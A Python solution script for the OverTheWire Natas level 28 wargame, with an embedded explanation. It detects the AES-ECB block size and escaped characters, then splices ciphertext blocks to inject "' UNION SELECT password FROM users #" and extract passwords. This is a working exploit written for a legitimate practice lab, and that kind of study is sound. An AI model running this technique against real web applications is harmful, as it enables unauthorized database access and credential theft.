import base64
import binascii
from tools import cryptotools
import requests
from requests.auth import HTTPBasicAuth
import urllib.parse
from secret.credentials import Credentials


def detect_block_length(credentials):
    print("Detecting block length: ")
    block_size = 0
    parameters = {"query": 'A'}
    r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
    location = r.history[0].headers['Location']
    if location[:18] == 'search.php/?query=':
        encrypted_query_length = len(base64.b64decode(urllib.parse.unquote(location[18:])))
    else:
        return -1

    for bs in range(2, 64):
        parameters = {"query": 'A' * bs}
        r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
        location = r.history[0].headers['Location']
        if location[:18] == 'search.php/?query=':
            current_len = len(base64.b64decode(urllib.parse.unquote(location[18:])))
            if current_len > encrypted_query_length:
                block_size = current_len - encrypted_query_length
                break
    print("Block size is: " + str(block_size))
    return block_size


def detect_escaped_characters(credentials, block_size):
    # detect which characters are escaped
    escaped_chars = ''
    for i in range(32, 127):
        parameters = {"query": chr(i) * block_size}
        r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
        location = r.history[0].headers['Location']
        if location[:18] == 'search.php/?query=':
            encrypted = binascii.hexlify(base64.b64decode(urllib.parse.unquote(location[18:])))
            print(
                'par_size: ' + str(len(parameters['query'])) + '  encrypted blocks: ' + str(len(encrypted) / (block_size * 2)) +
                '   Par_content: ' + str(binascii.hexlify(bytearray(parameters['query'].encode('ascii')))))
            print([encrypted[i:i + (block_size * 2)] for i in range(0, len(encrypted), (block_size * 2))])
            if len(encrypted) / (block_size * 2) > 6:
                escaped_chars += chr(i)
        else:
            print("Wrong response - cannot parse location header.")
    print('Chars that are escaped: ' + escaped_chars)
    return escaped_chars


def detect_bytes_to_pad(credentials, block_size):
    previous_array = b''
    bytes_to_pad = -1
    for i in range(0, block_size):
        parameters = {"query": 'A' * i}
        r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
        location = r.history[0].headers['Location']
        if location[:18] == 'search.php/?query=':
            encrypted = binascii.hexlify(base64.b64decode(urllib.parse.unquote(location[18:])))
            if cryptotools.compare_bytearrays(previous_array,
                                              bytearray(encrypted[4*block_size:6*block_size])) and bytes_to_pad == -1:
                bytes_to_pad = i - 1
            print(
                'par_size: '+str(len(parameters['query']))+' encrypted blocks: '+str(len(encrypted)/(block_size*2)) +
                '   Par_content: ' + str(binascii.hexlify(bytearray(parameters['query'].encode('ascii')))))
            print([encrypted[i:i + (block_size * 2)] for i in range(0, len(encrypted), (block_size * 2))])
            previous_array = bytearray(encrypted[4 * block_size:6 * block_size])
        else:
            print("Wrong response - cannot parse location header.")
    print("Bytes to pad before text: " + str(bytes_to_pad))
    return bytes_to_pad


def main():
    level = 28
    level_about = 'In this level, sadly, you cannot see a sourcecode of vulnerable website. After submitting a form\n'\
                  'with input "A" we get the some jokes. We can see that our request is encoded in url parameter \n' \
                  'search.php/?query= ... . Our request is encrypted somehow. After few more tries we can see that \n' \
                  'if we set input as some "B", "C" or "AAAAAAAAAAAAAAAAA" or even more of "A"s the beggining of \n' \
                  'encrypted query remains the same and moreover we have some repeating data in our parameter.\n' \
                  'This gives us a clue that we area dealing with some multibyte XOR or sth like AES in ECB MODE. \n' \
                  'Furthermore we notice that the size of the query (which is base64 encoded) seems to be a fixed \n' \
                  'block size with size of 16 bytes. After trying to do some SQL injections nothing happens \n'\
                  'posting chars like apostrophe or question marks doesn\'t work. Moreover these chars seems to be \n' \
                  'properly escaped, as submitting each of this chars gives us valid output with jokes including \n' \
                  'this chars. No we test if the query contains already escaped form of our string by comparing \n' \
                  'length of output with submited 32*"A" and 32*"\'" and.... \n' \
                  'Voila! The output length differs. That means if we find a way to modify the encrypted query in \n' \
                  'the way that it no more contains escaping chars we can execute what we want. We assume the query \n'\
                  'looks like this: SELECT column_name FROM table_with_jokes WHERE column_name LIKE \'%QUERY%\' \n' \
                  'We have full control over QUERY parameter (we have in mind that some chars will be escaped). \n' \
                  'Here is what we\'re going to do: \n' \
                  '1. We will make sure of a length of a block size (which seems to be 16 bytes long) \n' \
                  '2. Then we will detect all chars that are gonna be escaped based on varying query length. \n' \
                  '3. Then we detect the position of out QUERY in a block \n' \
                  '4. Now generate some good blocks which we will be needed later \n' \
                  '5. We generate magic block by posting a QUERY where escaping char remains in preceding block\n' \
                  '6. Now after we have our block with unescaped apostrophe we glue the well formated blocks to it \n'\
                  '7. Voila! We should be able to run our SQL Injection!'

    print("Hi there!\nyou've just run natas level " + str(level) +
          " (http://overthewire.org/wargames/natas/). Credentials are available in the secrets/credentials.py")

    print("\n" + level_about + "\n\n")

    # Real solution starts here :-)

    # TODO - this code needs serious cleanup!
    # If you are bored of computing everything every time sy AIE!
    bored = False
    crypt = cryptotools.CryptoTools(encrypted=base64.b64decode('G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmk'
                                                               'ZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySvj'
                                                               '3zYcY5Nhmsez6dCXsRGup36O0aq+C10FxP/mrBQjq0eOsaH+JhosbB'
                                                               'UGEQmz/to='))
    level_credentials = HTTPBasicAuth('natas' + str(level), Credentials.natas_credentials['natas' + str(level)])

    block_size = detect_block_length(level_credentials)
    escaped_characters = detect_escaped_characters(level_credentials, block_size)

    # detect placement of our data inside a ciphertext
    bytes_to_pad = detect_bytes_to_pad(level_credentials, block_size)

    # Get 3 first blocks containing 1* A in query
    parameters = {"query": 'A' * 10}
    r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=level_credentials)
    location = r.history[0].headers['Location']
    nice_begin_blocks = b''
    if location[:18] == 'search.php/?query=':
        encrypted = base64.b64decode(urllib.parse.unquote(location[18:]))
        nice_begin_blocks = encrypted[:block_size * 3]

    # Now generate block with unescaped ' and union statement
    statement = (' ' * (bytes_to_pad - 1)) + "' UNION SELECT password FROM users #"
    # We use bytes_to_pad -1 above so the escape char remains in third block
    parameters = {"query": statement}
    r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=level_credentials)
    location = r.history[0].headers['Location']
    nice_blocks = b''
    if location[:18] == 'search.php/?query=':
        encrypted = base64.b64decode(urllib.parse.unquote(location[18:]))
        nice_blocks = encrypted[block_size * 3:]
    else:
        print("Wrong response - cannot parse location header.")

    payload = base64.b64encode(nice_begin_blocks + nice_blocks)
    payload = str(payload)[2:-1]
    # consider URL encoding here (most browsers don't rly need it anyway - and it's not a bug it's a feature)
    print("Heavy payload here: " + payload)

    parameters = {'query': payload}
    print(str(parameters))
    r = requests.post('http://natas28.natas.labs.overthewire.org/search.php', data=parameters, auth=level_credentials)
    print(r.text)

    return True


if __name__ == '__main__':
    main()
